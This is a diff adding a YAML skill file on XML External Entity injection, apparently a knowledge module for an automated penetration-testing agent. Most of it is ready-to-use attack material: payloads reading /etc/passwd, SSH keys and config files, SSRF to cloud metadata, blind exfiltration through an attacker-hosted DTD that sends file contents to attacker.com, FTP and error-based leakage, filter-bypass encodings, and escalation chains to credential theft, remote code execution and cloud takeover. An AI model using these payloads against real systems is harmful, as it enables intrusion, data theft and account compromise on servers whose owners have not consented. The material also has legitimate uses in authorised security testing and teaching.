@@ -1,0 +1,221 @@
+name: xxe
+description: XML External Entity injection, blind exfiltration, and parser exploitation techniques
+techniques:
+  - "Classic external entity file read and SSRF"
+  - "Blind XXE via out-of-band parameter entity exfiltration"
+  - "Error-based XXE data extraction"
+  - "XInclude injection for partial XML control"
+  - "XXE in file upload formats (SVG, DOCX, XLSX, SAML)"
+  - "Parser-specific bypass and encoding tricks"
+tools:
+  - httpx
+  - nuclei
+  - curl
+  - browser_navigate
+knowledge: |
+  XXE exploits XML parsers that resolve external entities. When an application parses user-controlled XML,
+  an attacker can define entities that read local files, make network requests, or exfiltrate data.
+  The impact ceiling is file read + SSRF; chain with credential discovery for RCE.
+
+  ## Attack Surfaces — Where XML Hides
+  Obvious:
+    - SOAP endpoints (Content-Type: text/xml, application/soap+xml).
+    - REST APIs accepting application/xml or text/xml.
+    - XML-RPC endpoints (/xmlrpc.php in WordPress).
+  Less obvious:
+    - JSON endpoints: change Content-Type to application/xml and send XML body — many frameworks
+      auto-negotiate content type and parse whatever they receive.
+    - File uploads: SVG (image/svg+xml), DOCX/XLSX/PPTX (they're ZIP archives containing XML),
+      PDF with XMP metadata, EPUB, RSS/Atom feeds, sitemap.xml.
+    - SAML responses: the identity provider returns XML; if the SP parses it unsafely, XXE.
+    - XMPP/Jabber: XML-based chat protocol; message stanzas can contain entities.
+    - Configuration endpoints: web.config, plist, XML-based API imports.
+    - Excel imports: upload .xlsx, modify xl/sharedStrings.xml or [Content_Types].xml inside the ZIP.
+
+  ## Classic XXE — External Entity File Read
+  Basic payload:
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <root>&xxe;</root>
+  Windows targets:
+    file:///C:/Windows/win.ini
+    file:///C:/inetpub/wwwroot/web.config
+    file:///C:/Users/Administrator/.ssh/id_rsa
+  Directory listing (Java parsers):
+    file:///etc/ — some parsers return directory contents as a listing.
+    netdoc:///etc/ — Java-specific protocol for directory enumeration.
+  Source code via PHP filter:
+    php://filter/convert.base64-encode/resource=/var/www/html/config.php
+    Returned as base64 — avoids XML parsing errors from special characters in source.
+
+  ## SSRF via XXE
+    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+  Combine with SSRF knowledge: cloud metadata, internal services, port scanning.
+  Protocol tricks:
+    gopher:// — send raw TCP; interact with Redis, SMTP, etc.
+    jar:// — Java only; jar:http://attacker/evil.jar!/file.txt downloads and extracts.
+    expect:// — PHP only (if expect module loaded); expect://id executes commands.
+    netdoc:// — Java only; alternative to file://.
+
+  ## Blind XXE — Out-of-Band Exfiltration
+  When entity value isn't reflected in response, use parameter entities + external DTD.
+
+  Attacker hosts evil.dtd at http://attacker.com/evil.dtd:
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+    %eval;
+    %exfil;
+
+  Payload sent to target:
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+      <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+      %dtd;
+    ]>
+    <root>anything</root>
+
+  The parser loads the external DTD, evaluates nested entities, and sends file contents
+  to attacker's server in the URL query string.
+
+  Limitations:
+    - Multi-line files break URL exfiltration (newlines in query string).
+    - Use base64 encoding via php://filter or FTP-based exfil for multi-line data.
+    - FTP exfil: exfiltrate via passive FTP — multi-line data sent as FTP commands.
+      ENTITY ... SYSTEM "ftp://attacker.com:2121/%file;"
+
+  ## Error-Based XXE
+  When OOB is blocked but error messages are verbose:
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+    %eval;
+    %error;
+  The parser tries to open a file path containing the file contents → error message leaks the data.
+  Requires: verbose error reporting (common in dev/staging environments).
+
+  ## XInclude Injection
+  When you can't control the full XML document (e.g., your input is placed inside a single field):
+    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+      <xi:include parse="text" href="file:///etc/passwd"/>
+    </foo>
+  Inject this as the value of a parameter that gets embedded in a larger XML structure.
+  No DOCTYPE needed — XInclude uses its own namespace and processing instructions.
+  Works when the parser supports XInclude processing (common in Java, .NET).
+
+  ## File Upload XXE
+  SVG:
+    <?xml version="1.0"?>
+    <!DOCTYPE svg [
+      <!ENTITY xxe SYSTEM "file:///etc/hostname">
+    ]>
+    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+      <text x="0" y="20">&xxe;</text>
+    </svg>
+    Upload as profile picture, avatar, or any image field that accepts SVG.
+    The exfiltrated data renders in the displayed image.
+
+  DOCX/XLSX/PPTX:
+    1. Create a legitimate .docx file.
+    2. Unzip it (it's a ZIP archive).
+    3. Edit word/document.xml or [Content_Types].xml — inject DOCTYPE with external entity.
+    4. Rezip and upload.
+    If the server parses the XML inside the document (e.g., to extract text, generate preview),
+    the entity resolves.
+
+  SAML response:
+    If you can manipulate the SAML XML before the service provider parses it, inject entities.
+    Common in SSO flows where the response passes through the browser.
+
+  ## Parser-Specific Behaviors
+  Java (SAX, DOM, StAX):
+    Supports file://, http://, https://, jar://, netdoc://.
+    Default configuration often allows external entities.
+    Disable: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
+  PHP (libxml):
+    Supports file://, http://, php://, expect://, compress.zlib://.
+    libxml >= 2.9 disables external entities by default — but LIBXML_NOENT flag re-enables.
+    Check phpinfo() for libxml version.
+  .NET (XmlDocument, XmlReader):
+    Pre-.NET 4.5.2: external entities enabled by default.
+    Post-.NET 4.5.2: disabled by default, but custom XmlReaderSettings may re-enable.
+    Supports file://, http://.
+  Python (lxml, xml.etree):
+    xml.etree.ElementTree: doesn't process external entities (safe by default).
+    lxml: depends on configuration — resolve_entities=True is vulnerable.
+    defusedxml: safe wrapper — check if the app uses it.
+
+  ## Encoding and Bypass Techniques
+  When the parser blocks DOCTYPE or ENTITY keywords:
+    UTF-7 encoding: +ADw-!DOCTYPE foo+AFs-+ADw-!ENTITY xxe SYSTEM ... — some parsers auto-detect encoding.
+    UTF-16: prepend BOM (FF FE) and encode payload in UTF-16 — bypasses ASCII-based WAF rules.
+    XML encoding declaration: <?xml version="1.0" encoding="UTF-16"?>
+  Entity encoding within entities:
+    Use character references: &#x25; for %, &#x26; for & inside entity definitions.
+    Hex encoding of keywords: &#x53;YSTEM instead of SYSTEM (doesn't work in all parsers).
+  CDATA wrapping:
+    <![CDATA[<anything>]]> — bypass content-level filters, not entity-level.
+    Useful when combining parameter entities to wrap file content in CDATA for safe XML embedding:
+      <!ENTITY % start "<![CDATA[">
+      <!ENTITY % end "]]>">
+      <!ENTITY % combined "%start;%file;%end;">
+  Parameter entity nesting:
+    Regular entities (<!ENTITY foo "bar">) can't contain other entity references in internal DTD.
+    Parameter entities (<!ENTITY % foo "bar">) CAN nest via external DTD — that's why blind XXE
+    requires hosting an external DTD file.
+  Content-Type bypass:
+    Some WAFs only inspect XML for Content-Type: text/xml — try application/xml, text/html+xml,
+    application/xhtml+xml, or multipart with XML part.
+
+  ## Escalation Chains
+  XXE → file read → /etc/shadow or web.config → credentials → SSH/RDP access → RCE.
+  XXE → file read → application source code → hardcoded API keys → third-party service compromise.
+  XXE → SSRF → cloud metadata → IAM credentials → cloud account takeover.
+  XXE → file read → /proc/self/environ → environment variable secrets → database access.
+  XXE → SSRF → internal Jenkins → Groovy console → RCE on build server.
+  Blind XXE → OOB exfiltration → slow but complete file read → credential harvesting.
+  SVG XXE → stored response → any user viewing the image triggers file read (persistent XXE).
+
+  ## Common Pitfalls
+  - Test for XXE even on JSON APIs — Content-Type switching catches many developers off guard.
+  - Multi-line file exfil fails via HTTP query strings; use FTP or error-based techniques.
+  - WAFs may block "ENTITY" keyword — try encoding or XInclude (no DOCTYPE needed).
+  - Some parsers limit entity expansion depth (billion laughs protection) but still allow external entities.
+  - Blind XXE requires your server to be reachable from the target — check egress filtering.
+  - DOCX/XLSX XXE is high-impact because file upload is often not considered an XML parsing surface.
+  - Always try both parameter entities (% prefix) and general entities — different restrictions apply.
+examples:
+  - title: "Classic File Read via External Entity"
+    description: "Read /etc/passwd using a standard external entity declaration"
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+    validation: "Response body contains /etc/passwd contents (root:x:0:0:...); confirms external entity resolution is enabled"
+  - title: "Blind XXE via External DTD"
+    description: "Exfiltrate file contents out-of-band when response doesn't reflect entity values"
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><root>x</root>"
+    validation: "Attacker's HTTP server receives request containing file contents in URL query parameter; evil.dtd chains %file and %exfil entities"
+  - title: "SVG Upload XXE"
+    description: "Embed XXE payload in an SVG file uploaded as an image"
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+    validation: "Rendered SVG image displays hostname content; or view page source where SVG is embedded to find exfiltrated data"
+  - title: "XInclude Injection in Single Field"
+    description: "Inject XInclude when you can't control the full XML document structure"
+    payload: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+    validation: "Contents of /etc/passwd appear in the application's response where the injected field value is rendered"
+  - title: "Content-Type Switching on JSON Endpoint"
+    description: "Switch Content-Type from JSON to XML to discover hidden XML parsing"
+    payload: "POST /api/data HTTP/1.1\\nContent-Type: application/xml\\n\\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+    validation: "Server accepts XML body on a normally-JSON endpoint and processes the entity; response contains file contents or OOB callback received"
+  - title: "DOCX XXE via Modified Archive"
+    description: "Inject XXE into a DOCX file's internal XML and upload for processing"
+    payload: "Unzip legit.docx → edit word/document.xml to add <!DOCTYPE [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe-confirm'>]> → rezip → upload"
+    validation: "Attacker receives HTTP callback when the server parses the uploaded DOCX; confirms XML parsing of uploaded Office documents"
+validation_methods:
+  - "Verify file contents (e.g., /etc/passwd, win.ini) appear in the response body, proving external entity resolution"
+  - "Confirm out-of-band exfiltration by receiving HTTP/DNS/FTP callbacks containing target file data on attacker-controlled server"
+  - "Test XInclude and Content-Type switching independently to identify all XML parsing surfaces"
+  - "Upload crafted SVG/DOCX/XLSX files and verify entity resolution occurs during server-side processing"
+  - "Compare responses between payloads with valid vs invalid file paths to confirm error-based data leakage"
+references:
+  - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+  - "https://portswigger.net/web-security/xxe"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
